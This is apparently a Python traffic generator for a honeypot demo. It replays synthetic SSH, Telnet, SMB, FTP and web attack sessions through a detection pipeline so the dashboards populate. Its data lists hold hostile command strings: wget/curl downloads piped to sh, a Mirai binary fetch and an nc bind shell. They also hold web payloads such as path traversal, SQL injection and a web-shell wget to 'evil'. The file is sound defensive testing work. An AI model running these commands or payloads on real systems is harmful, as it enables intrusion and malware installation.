"""
simulate.py — attack traffic generator for testing and demos.

Because a locally-run honeypot only ever sees traffic from the Docker network
(RFC1918 IPs with no geolocation), this harness replays realistic attack
sessions using a set of real-world public source IPs so the geo-map, charts and
threat-intel enrichment populate the way they would on an internet-exposed
sensor. It feeds synthetic events through the *same* pipeline as live capture —
nothing here bypasses detection or storage.

Trigger via  POST /api/simulate?sessions=8
"""
from __future__ import annotations
import asyncio
import random
from datetime import datetime, timezone

# A spread of real, publicly-routable ranges commonly seen scanning the internet
# (bogon/known-scanner space) — used only to exercise geolocation in the demo.
SOURCE_IPS = [
    "45.155.205.233", "185.220.101.44", "89.248.165.72", "193.169.255.10",
    "141.98.11.29", "218.92.0.34", "61.177.173.18", "222.186.30.112",
    "5.188.206.18", "80.94.95.116", "92.63.197.55", "116.31.116.24",
    "195.178.110.9", "103.145.13.21", "212.70.149.150", "198.98.51.189",
]
USERNAMES = ["root", "admin", "test", "ubuntu", "oracle", "postgres", "user", "git", "pi"]
PASSWORDS = ["123456", "root", "admin", "password", "12345678", "toor",
             "P@ssw0rd", "qwerty", "1234", "letmein", "0000"]
RECON_CMDS = ["whoami", "uname -a", "cat /etc/passwd", "ps aux", "id", "cat /proc/cpuinfo",
              "ls -la", "cat /etc/os-release", "w"]
MALICIOUS_CMDS = [
    "wget http://45.155.205.233/x86_64 -O /tmp/.a",
    "curl -s http://185.220.101.44/miner.sh | sh",
    "wget http://89.248.165.72/bins/mirai.arm7",
    "nc -lvnp 4444 -e /bin/sh",
    "chmod +x /tmp/.a && ./tmp/.a",
]

# Dionaea multi-protocol scenarios: (protocol, dst_port)
DIO_SERVICES = [("smb", 445), ("http", 80), ("ftp", 21),
                ("mssql", 1433), ("mysql", 3306)]
FTP_USERS = ["anonymous", "admin", "ftp", "root", "www", "test"]
EXPLOIT_HINTS = [
    "smbd: MS17-010 EternalBlue exploit attempt on IPC$ tree connect",
    "smbd: MS08-067 NetPathCanonicalize RPC overflow attempt",
    "http: sqlmap/1.7 scan of /admin.php?id=1' UNION SELECT",
    "smbd: shellcode / meterpreter reverse_shell staged in SMB payload",
]

# Self-written HTTP honeypot (webtrap) scenarios
WEB_PATHS = ["/wp-login.php", "/.env", "/.git/config", "/phpmyadmin/", "/admin/login",
             "/xmlrpc.php", "/actuator/env", "/.aws/credentials", "/boaform/admin/formLogin",
             "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"]
WEB_UAS = ["sqlmap/1.7.2", "Nikto/2.5.0", "python-requests/2.31.0", "curl/8.4.0",
           "Mozilla/5.0 (compatible; Nuclei)", "Go-http-client/1.1",
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]
WEB_EXPLOITS = ["/index.php?page=../../../../etc/passwd", "/?id=1%20UNION%20SELECT%201,2,3",
                "/cgi-bin/.%2e/%2e%2e/bin/sh", "/shell.php?cmd=wget+http://evil/x.sh"]


def _now():
    return datetime.now(timezone.utc).isoformat()


async def _cowrie_session(pipeline) -> int:
    """One SSH/Telnet attacker session (Cowrie)."""
    ip = random.choice(SOURCE_IPS)
    sess = f"{random.randint(0, 0xffffffffffff):012x}"
    proto = "telnet" if random.random() < 0.2 else "ssh"
    dport = 2223 if proto == "telnet" else 2222
    base = {"src_ip": ip, "session": sess, "dst_port": dport,
            "sensor": "sim-sensor", "honeypot": "cowrie"}
    n = 0

    await pipeline.ingest_synthetic({**base, "eventid": "cowrie.session.connect",
                                     "protocol": proto,
                                     "src_port": random.randint(1024, 65535),
                                     "dst_ip": "10.0.0.5"})
    await pipeline.ingest_synthetic({**base, "eventid": "cowrie.client.version",
                                     "version": "SSH-2.0-libssh2_1.9.0"})
    n += 2

    for _ in range(random.randint(3, 8)):     # brute force
        await pipeline.ingest_synthetic({
            **base, "eventid": "cowrie.login.failed",
            "username": random.choice(USERNAMES),
            "password": random.choice(PASSWORDS)})
        n += 1
        await asyncio.sleep(0.02)

    if random.random() < 0.45:                 # ~45% break in
        await pipeline.ingest_synthetic({
            **base, "eventid": "cowrie.login.success",
            "username": random.choice(["admin", "root", "test"]),
            "password": random.choice(["admin", "1234", "root"])})
        n += 1
        for cmd in random.sample(RECON_CMDS, random.randint(2, 4)):
            await pipeline.ingest_synthetic({**base, "eventid": "cowrie.command.input", "input": cmd})
            n += 1
        if random.random() < 0.7:
            await pipeline.ingest_synthetic({
                **base, "eventid": "cowrie.command.input",
                "input": random.choice(MALICIOUS_CMDS)})
            n += 1

    await pipeline.ingest_synthetic({**base, "eventid": "cowrie.session.closed",
                                     "duration": round(random.uniform(2, 40), 1)})
    return n + 1


async def _dionaea_session(pipeline) -> int:
    """One Dionaea session against a non-SSH service (SMB/FTP/HTTP/MSSQL/MySQL)."""
    ip = random.choice(SOURCE_IPS)
    proto, dport = random.choice(DIO_SERVICES)
    base = {"src_ip": ip, "sensor": "sim-sensor", "honeypot": "dionaea",
            "protocol": proto, "dst_port": dport,
            "src_port": random.randint(1024, 65535)}
    n = 0

    # scanners hit a service several times — exercises the scan-correlation rule
    for _ in range(random.randint(1, 4)):
        await pipeline.ingest_synthetic({
            **base, "eventid": "dionaea.connection",
            "message": f"{proto} connection (tcp)"})
        n += 1
        await asyncio.sleep(0.02)

    if proto == "ftp":                         # FTP brute force + occasional grab
        for _ in range(random.randint(2, 6)):
            await pipeline.ingest_synthetic({
                **base, "eventid": "dionaea.ftp.login",
                "username": random.choice(FTP_USERS),
                "password": random.choice(PASSWORDS)})
            n += 1
            await asyncio.sleep(0.02)
        if random.random() < 0.4:
            await pipeline.ingest_synthetic({
                **base, "eventid": "dionaea.ftp.command",
                "command": f"RETR /pub/{random.choice(['backup.zip','shadow','db.sql'])}"})
            n += 1

    if proto in ("smb", "http") and random.random() < 0.6:   # exploit / malware
        await pipeline.ingest_synthetic({
            **base, "eventid": "dionaea.alert",
            "message": random.choice(EXPLOIT_HINTS)})
        n += 1
        if random.random() < 0.5:
            await pipeline.ingest_synthetic({
                **base, "eventid": "dionaea.download.complete",
                "message": "Stored binary sha256:%032x" % random.getrandbits(128)})
            n += 1

    return n


async def _webtrap_session(pipeline) -> int:
    """One web-scanner session against the self-written HTTP honeypot."""
    ip = random.choice(SOURCE_IPS)
    ua = random.choice(WEB_UAS)
    base = {"src_ip": ip, "honeypot": "webtrap", "protocol": "http",
            "user_agent": ua, "src_port": random.randint(1024, 65535)}
    n = 0

    if any(t in ua.lower() for t in ("sqlmap", "nikto", "nuclei", "requests", "curl", "go-http")):
        await pipeline.ingest_synthetic({**base, "eventid": "webtrap.scanner",
                                         "method": "GET", "path": "/"})
        n += 1
    for p in random.sample(WEB_PATHS, random.randint(2, 5)):
        await pipeline.ingest_synthetic({**base, "eventid": "webtrap.recon",
                                         "method": "GET", "path": p})
        n += 1
        await asyncio.sleep(0.01)
    if random.random() < 0.5:
        await pipeline.ingest_synthetic({**base, "eventid": "webtrap.credential",
                                         "method": "POST", "path": "/wp-login.php",
                                         "username": random.choice(USERNAMES),
                                         "password": random.choice(PASSWORDS)})
        n += 1
    if random.random() < 0.4:
        await pipeline.ingest_synthetic({**base, "eventid": "webtrap.exploit",
                                         "method": "GET", "path": random.choice(WEB_EXPLOITS)})
        n += 1
    return n


async def run(pipeline, sessions: int = 8):
    """Generate `sessions` attacker sessions and push them through the pipeline.
    Sessions are split across all three sensors (Cowrie SSH/Telnet, Dionaea
    multi-protocol, and the self-written web honeypot) so every panel populates."""
    generated = 0
    for _ in range(sessions):
        r = random.random()
        if r < 0.30:
            generated += await _dionaea_session(pipeline)
        elif r < 0.55:
            generated += await _webtrap_session(pipeline)
        else:
            generated += await _cowrie_session(pipeline)
        await asyncio.sleep(0.05)
    return generated
